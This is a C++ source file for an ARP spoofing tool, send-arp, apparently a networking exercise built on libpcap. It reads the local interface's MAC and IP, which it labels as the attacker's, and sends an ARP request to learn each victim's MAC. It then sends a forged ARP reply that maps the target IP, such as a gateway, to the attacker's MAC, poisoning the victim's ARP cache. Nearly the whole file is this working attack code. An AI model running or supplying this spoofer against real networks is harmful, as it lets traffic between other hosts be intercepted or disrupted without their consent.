#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <stdio.h>    //printf
#include <string.h>   //strncpy
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>   //ifreq
#include <unistd.h>   //close

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

struct ifreq ifr;

void iface_to_mac(char* iface) {
	int fd;
	fd = socket(AF_INET, SOCK_DGRAM, 0);
	ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name , iface , IFNAMSIZ-1);
	ioctl(fd, SIOCGIFHWADDR, &ifr);
	close(fd);
}

void iface_to_ip(char* iface) {
	int fd;
	fd = socket(AF_INET, SOCK_DGRAM, 0);
	ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name , iface , IFNAMSIZ-1);
	ioctl(fd, SIOCGIFADDR, &ifr);
	close(fd);
}

int main(int argc, char* argv[]) {
	if (argc < 4) {
      usage();
      return -1;
    }

	for (int i = 2; i<argc; i = i+2) {
		// 1. Get Attacker's MAC addr
		char* dev = argv[1];
		iface_to_mac(dev);

		Mac atk_mac((unsigned char*)ifr.ifr_hwaddr.sa_data);
		std::string atk_mac_str = std::string(atk_mac);

		printf("Attacker's MAC Address : %s\n", atk_mac_str.c_str());

		// 2. Get Attacker's IP addr
		iface_to_ip(dev);

		struct sockaddr_in* ipaddr = (struct sockaddr_in*)&ifr.ifr_addr;
		Ip atk_ip(inet_ntoa(ipaddr->sin_addr));

		std::string atk_ip_str = std::string(atk_ip);
		printf("Attacker's IP Address : %s\n", atk_ip_str.c_str());
		
		// 2. Get Sender's Mac Address - Request
		char errbuf[PCAP_ERRBUF_SIZE];
		pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
		if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
		}

		Ip sender_ip = Ip(argv[i]);
		EthArpPacket packet;
		packet.eth_.dmac_ = Mac::broadcastMac();
		packet.eth_.smac_ = atk_mac;
		packet.eth_.type_ = htons(EthHdr::Arp);

		packet.arp_.hrd_ = htons(ArpHdr::ETHER);
		packet.arp_.pro_ = htons(EthHdr::Ip4);
		packet.arp_.hln_ = Mac::SIZE;
		packet.arp_.pln_ = Ip::SIZE;
		packet.arp_.op_ = htons(ArpHdr::Request);
		packet.arp_.smac_ = atk_mac;
		packet.arp_.sip_ = htonl(atk_ip);
		packet.arp_.tmac_ = Mac::nullMac();
		packet.arp_.tip_ = htonl(sender_ip);

		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		}

		// 3. Get Sender's Mac Address - Reply
		Mac sender_mac;
		while (1) {
			struct pcap_pkthdr* header;
			const u_char* packet;
			int res = pcap_next_ex(handle, &header, &packet);
			if (res == 0) continue;
			if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
				printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
				break;
			}

			struct EthArpPacket* recv_packet = (struct EthArpPacket*)packet;
			if (ntohs(recv_packet->eth_.type_) == EthHdr::Arp &&
				ntohs(recv_packet->arp_.op_) == ArpHdr::Reply &&
				recv_packet->arp_.sip_ == Ip(htonl(sender_ip))) {
				sender_mac = recv_packet->arp_.smac_;
				std::string sender_mac_str = std::string(sender_mac);
				printf("Sender's MAC Address : %s\n", sender_mac_str.c_str());

				break;
			}
		}

		// 4. ARP Spoofing
		EthArpPacket atk_packet;
		Ip target_ip = Ip(argv[i+1]);
		atk_packet.eth_.dmac_ = sender_mac;
		atk_packet.eth_.smac_ = atk_mac;
		atk_packet.eth_.type_ = htons(EthHdr::Arp);

		atk_packet.arp_.hrd_ = htons(ArpHdr::ETHER);
		atk_packet.arp_.pro_ = htons(EthHdr::Ip4);
		atk_packet.arp_.hln_ = Mac::SIZE;
		atk_packet.arp_.pln_ = Ip::SIZE;
		atk_packet.arp_.op_ = htons(ArpHdr::Reply);
		atk_packet.arp_.smac_ = atk_mac;
		atk_packet.arp_.sip_ = htonl(target_ip);
		atk_packet.arp_.tmac_ = sender_mac;
		atk_packet.arp_.tip_ = htonl(sender_ip);

		res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&atk_packet), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		}

		pcap_close(handle);
	}
}
